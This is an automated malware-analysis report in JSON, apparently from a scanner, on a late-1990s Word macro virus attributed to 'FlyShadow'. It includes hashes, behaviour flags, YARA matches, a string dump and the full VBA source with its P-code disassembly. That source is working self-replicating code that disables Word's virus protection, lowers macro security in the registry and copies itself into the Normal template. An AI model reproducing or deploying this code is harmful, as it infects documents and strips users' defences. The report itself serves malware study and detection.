{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Environ": "May read system environment variables",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "System": "May run an executable file or a system command on a Mac",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "'Copyright (C) 1998 by FlyShadow ~^^~ - Shadow\nPrivate Sub Document_Close()\nOn Error Resume Next\nOptions.VirusProtection = (0)\nOptions.SaveNormalPrompt = (0)\nApplication.DisplayAlerts = (0)\nApplication.ScreenUpdating = (0)\nApplication.EnableCancelKey = (0)\n\u03b3 = Environ(\"WINDIR\") & \".\\TEMP\\\"\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1&\nDo While FileLen(\u03b3 & System.ProfileString(\"\", \"DefaultFileName\")) = 0\nRandomize: \u03b1 = \"~WR00000.TMP\": Mid(\u03b1, 4, 1) = Chr(Int((26 * Rnd) + 65)): Mid(\u03b1, 8, 1) = Int(Rnd() * 10)\nVBProject.VBComponents(1).Export (\u03b3 & \u03b1)\nOpen \u03b3 & \u03b1 For Input As #1\nFor \u03b7 = 1 To 4: Line Input #1, \ufffd: Next: \u03b7 = \"\"\nDo Until \u03b9 = \"'\ufffd\"\nLine Input #1, \u03b9\n\u03b7 = \u03b7 & \u03b9 & Chr(13) & Chr(10)\nLoop: Close #1\nOpen \u03b3 & \u03b1 For Output As #1: Print #1, \u03b7: Close #1\nSystem.ProfileString(\"\", \"DefaultFileName\") = \u03b1: Loop\nSet \u03b1 = IIf(MacroContainer <> NormalTemplate, NormalTemplate, ActiveDocument).VBProject.VBComponents(1)\nIf \u03b1.CodeModule.CountOfLines > 0 Or ActiveDocument.Path = \"\" Then Exit Sub\n\u03b1.CodeModule.AddFromFile \u03b3 & System.ProfileString(\"\", \"DefaultFileName\")\n\u03b1.CodeModule.Replaceline 2, \"Private Sub \" & IIf(MacroContainer <> NormalTemplate, \"Document_Open()\", \"Document_Close()\")\nEnd Sub\n'\ufffd\n\n' Processing file: VirusShare_3acb6e6373574e3278ceea31f7271c2c\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3194 bytes\n' Line #0:\n' \tQuoteRem 0x0000 0x002D \"Copyright (C) 1998 by FlyShadow ~^^~ - Shadow\"\n' Line #1:\n' \tFuncDefn (Private Sub Document_Close())\n' Line #2:\n' \tOnError (Resume Next) \n' Line #3:\n' \tLitDI2 0x0000 \n' \tParen \n' \tLd Options \n' \tMemSt VirusProtection \n' Line #4:\n' \tLitDI2 0x0000 \n' \tParen \n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #5:\n' \tLitDI2 0x0000 \n' \tParen \n' \tLd Application \n' \tMemSt DisplayAlerts \n' Line #6:\n' \tLitDI2 0x0000 \n' \tParen \n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #7:\n' \tLitDI2 0x0000 \n' \tParen \n' \tLd Application \n' \tMemSt EnableCancelKey \n' Line #8:\n' \tLitStr 0x0006 \"WINDIR\"\n' \tArgsLd Environ 0x0001 \n' \tLitStr 0x0007 \".\\TEMP\\\"\n' \tConcat \n' \tSt \u03b3 \n' Line #9:\n' \tLitDI4 0x0001 0x0000 \n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x003D \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\"\n' \tLitStr 0x0005 \"Level\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #10:\n' \tLd \u03b3 \n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x000F \"DefaultFileName\"\n' \tLd System \n' \tArgsMemLd ProfileString 0x0002 \n' \tConcat \n' \tArgsLd FileLen 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tDoWhile \n' Line #11:\n' \tArgsCall Read 0x0000 \n' \tBoS 0x0000 \n' \tLitStr 0x000C \"~WR00000.TMP\"\n' \tSt \u03b1 \n' \tBoS 0x0000 \n' \tLitDI2 0x001A \n' \tLd Rnd \n' \tMul \n' \tParen \n' \tLitDI2 0x0041 \n' \tAdd \n' \tFnInt \n' \tArgsLd Chr 0x0001 \n' \tLd \u03b1 \n' \tLitDI2 0x0004 \n' \tLitDI2 0x0001 \n' \tMid \n' \tBoS 0x0000 \n' \tArgsLd Rnd 0x0000 \n' \tLitDI2 0x000A \n' \tMul \n' \tFnInt \n' \tLd \u03b1 \n' \tLitDI2 0x0008 \n' \tLitDI2 0x0001 \n' \tMid \n' Line #12:\n' \tLd \u03b3 \n' \tLd \u03b1 \n' \tConcat \n' \tParen \n' \tLitDI2 0x0001 \n' \tLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tArgsMemCall Export 0x0001 \n' Line #13:\n' \tLd \u03b3 \n' \tLd \u03b1 \n' \tConcat \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Input)\n' Line #14:\n' \tStartForVariable \n' \tLd \u03b7 \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0004 \n' \tFor \n' \tBoS 0x0000 \n' \tLitDI2 0x0001 \n' \tLd \ufffd \n' \tLineInput \n' \tBoS 0x0000 \n' \tStartForVariable \n' \tNext \n' \tBoS 0x0000 \n' \tLitStr 0x0000 \"\"\n' \tSt \u03b7 \n' Line #15:\n' \tLd \u03b9 \n' \tLitStr 0x0002 \"'\ufffd\"\n' \tEq \n' \tDoUnitil \n' Line #16:\n' \tLitDI2 0x0001 \n' \tLd \u03b9 \n' \tLineInput \n' Line #17:\n' \tLd \u03b7 \n' \tLd \u03b9 \n' \tConcat \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tLitDI2 0x000A \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tSt \u03b7 \n' Line #18:\n' \tLoop \n' \tBoS 0x0000 \n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #19:\n' \tLd \u03b3 \n' \tLd \u03b1 \n' \tConcat \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' \tBoS 0x0000 \n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd \u03b7 \n' \tPrintItemNL \n' \tBoS 0x0000 \n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #20:\n' \tLd \u03b1 \n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x000F \"DefaultFileName\"\n' \tLd System \n' \tArgsMemSt ProfileString 0x0002 \n' \tBoS 0x0000 \n' \tLoop \n' Line #21:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tLd NormalTemplate \n' \tNe \n' \tLd NormalTemplate \n' \tLd ActiveDocument \n' \tArgsLd IIf 0x0003 \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tSet \u03b1 \n' Line #22:\n' \tLd \u03b1 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLitDI2 0x0000 \n' \tGt \n' \tLd ActiveDocument \n' \tMemLd Path \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tOr \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #23:\n' \tLd \u03b3 \n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x000F \"DefaultFileName\"\n' \tLd System \n' \tArgsMemLd ProfileString 0x0002 \n' \tConcat \n' \tLd \u03b1 \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromFile 0x0001 \n' Line #24:\n' \tLitDI2 0x0002 \n' \tLitStr 0x000C \"Private Sub \"\n' \tLd MacroContainer \n' \tLd NormalTemplate \n' \tNe \n' \tLitStr 0x000F \"Document_Open()\"\n' \tLitStr 0x0010 \"Document_Close()\"\n' \tArgsLd IIf 0x0003 \n' \tConcat \n' \tLd \u03b1 \n' \tMemLd CodeModule \n' \tArgsMemCall Replaceline 0x0002 \n' Line #25:\n' \tEndSub \n' Line #26:\n' \tQuoteRem 0x0000 0x0001 \"\ufffd\"\n"
    },
    "filename": "VirusShare_3acb6e6373574e3278ceea31f7271c2c",
    "filesize": 28160,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: -535, Title: Copyright  1998 by FlyShadow ~^^~, Author: FlyShadow, Template: Normal.dot, Last Saved By: FlyShadow, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Create Time/Date: Wed Jul  7 19:54:00 1999, Last Saved Time/Date: Wed Jul  7 19:55:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "3acb6e6373574e3278ceea31f7271c2c",
        "sha1": "f7f4104d11b6fbd84bc77d90c1f647fbf1bf11d2",
        "sha256": "955c65af91492775dcb9afcdd7b4250f9c93c620f2019e6cb797327ae8039079"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            "Copyright  1998 by FlyShadow ~^^~",
            ". A!",
            "-k=W[W",
            "@7@7",
            " \" % & ' 2 t%",
            "0013468:<>@BDOPQRTUVWZ\\^",
            "0579;=?ACY[]",
            "Copyright ",
            " 1998 by FlyShadow ~^^~",
            "FlyShadow",
            "Normal.dot",
            "FlyShadow",
            "Microsoft Word 8.0",
            "Copyright ",
            " 1998 by FlyShadow ~^^~",
            "Title",
            "_PID_GUID",
            "Copyright (C) 1998 by FlyShadow ~^^~ - Shadow",
            "WINDIR$",
            ".\\TEMP\\",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Level",
            "DefaultFileName",
            "$eA@6",
            "~WR00000.TMP'",
            "DefaultFileName",
            "DefaultFileName",
            "Private Sub  ",
            "Document_Open()",
            "Document_Close()$",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "'Copyrig",
            "ht (C) 1",
            "998 by F",
            "lyShadow",
            " ~^^~ - 1",
            "4 Sub _Cl",
            "On E",
            "rror ResA",
            " Next",
            "tions.Vi",
            "rusProtefc",
            "Applica!",
            ".Dis",
            "tyA lerts",
            "ScreenUpd",
            "CancelKey",
            "Envir",
            "on(\"WIND",
            "IR\") & \".\\TEMP\\",
            "System.@A@)fileSn",
            "g(\"\", \"H",
            "KEY_CURR",
            "ENT_USER@\\Softwu\\@Micros@",
            "Office\\9",
            ".0\\Word\\",
            "SecurityA",
            "Level",
            "Do $Wh",
            "Len(",
            ")& F!o",
            "DefaultA",
            "A\"))40",
            "RandA~e: ",
            "\"~WR0",
            ".TMP\": ",
            "Mid(\\, ",
            "4, 1",
            "(Int((26",
            " * Rnd) @+ 65))",
            "VBEj@x.VB@Compons(1).Ar",
            "1D\\B~en ",
            "FInput As #1",
            "b+1 To ",
            "4: Line ",
            "#1, :",
            "\t\"gKUnt",
            "il \"'",
            "&\t& A;13z",
            "Loop: ",
            "OutI&",
            "?5:#5",
            "5IIf(MaA",
            "GConta",
            "r <> de~,",
            "Akves)",
            "deModuleA@",
            "untOf&s",
            " > 0 Or A\t.Path",
            "\" Th\"Exi,t *\\)\tAddFromQc<!s!m\tRe~u",
            "@2gl$p",
            " \"`t$te",
            "E\"_9()",
            "d\"REnd",
            "2a3783a271",
            "Wordkp",
            "VBAp",
            "Win16~p",
            "Win32",
            "Macp",
            "M1&p",
            "stdole`p",
            "MSFormsC",
            "ThisDocument<p",
            "_Evaluate",
            "Normalp",
            "Office",
            "Project-p",
            "Documentjp",
            "Document_Close7\\p",
            "Optionsp",
            "VirusProtectionoDp",
            "SaveNormalPrompt\u02bcp",
            "Application*p",
            "DisplayAlertsp",
            "ScreenUpdating!",
            "EnableCancelKeyp",
            "Environ",
            "Systemap",
            "PrivateProfileString[",
            "FileLen",
            "ProfileString",
            "ChrK~p",
            "RndRp",
            "VBProjectOhp",
            "VBComponents",
            "Exportp",
            "IIfzp",
            "MacroContainer>p",
            "NormalTemplateqp",
            "ActiveDocument\\p",
            "CodeModule",
            "CountOfLines!\\p",
            "Path2",
            "AddFromFileup",
            "Replaceline",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\CWIN97\\SYSTEM\\",
            "2.tlb#OL",
            "E Automation",
            "MSForms>",
            "1D6460-B",
            "602-11CE",
            "-B822-C9",
            "9FB74805",
            "35E2.TWD",
            "#Microso(ft < ",
            " Librar:",
            "JP\\VBE\\E(EXg(",
            "KwNTalwNE",
            "@fOffic",
            "DF8D04C-",
            "5BFA-101@B-BDE5A*A4",
            "2ePR",
            "OGRAM FI",
            "LES\\MICR",
            "OSOFT OF FICE\\",
            "MSO97.DLL",
            "k# 8.0Rk",
            "ThisDocu ment",
            "i\"DIc",
            "ThisDocument",
            "ID=\"{EB3242A3-34DE-11D3-B822-B429188B2B02}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"AFAD1C692C7B317F317F317F317F\"",
            "DPB=\"BCBE0F7C118812881288\"",
            "GC=\"D2D061957696769689\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=110, 110, 450, 355, Z",
            "Microsoft Word ",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "MSO97.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.297590",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
